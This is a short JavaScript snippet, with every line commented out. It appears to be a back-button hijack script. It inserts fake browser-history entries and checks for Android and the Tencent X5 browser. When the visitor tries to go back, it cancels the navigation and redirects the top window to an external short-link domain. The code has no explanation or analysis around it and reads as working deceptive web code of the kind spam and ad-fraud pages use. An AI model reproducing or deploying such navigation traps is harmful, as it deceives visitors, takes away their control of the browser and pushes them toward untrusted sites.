// (function () {
//     history.pushState(history.length + 1, "message", window.location.href.split('#')[0] + "#" + new Date().getTime());

//     // 判断是否为 Android 设备
//     function isAndroid() {
//         return /Android/i.test(navigator.userAgent);
//     }

//     // 执行跳转逻辑
//     function getandjump() {
//         window.history.pushState("forward", null, "#");
//         window.history.forward(1);

//         setTimeout(() => {
//             top.location.href = 'https://u.pvruw.cn/3114';
//         }, 100);
//     }

//     if (isAndroid()) {
//         console.log("Android-------");
//         if (typeof (tbsJs) !== "undefined") {
//             try {
//                 tbsJs.onReady('{useCachedApi : "true"}', function (e) { });
//             } catch (error) {
//                 console.error("tbsJs.onReady 出错:", error);
//             }
//             window.onhashchange = function () {
//                 getandjump();
//             };
//             console.log("tbsJs-------");
//         } else {
//             var pop = 0;
//             window.onhashchange = function (event) {
//                 pop++;
//                 console.log("pop-------", pop);
//                 if (pop >= 3) {
//                     getandjump();
//                 } else {
//                     history.go(1);
//                 }
//             };
//             history.go(-1);
//         }
//     } else {
//         console.log("非Android-------");
//         window.onhashchange = function () {
//             getandjump();
//         };
//     }
// })();
    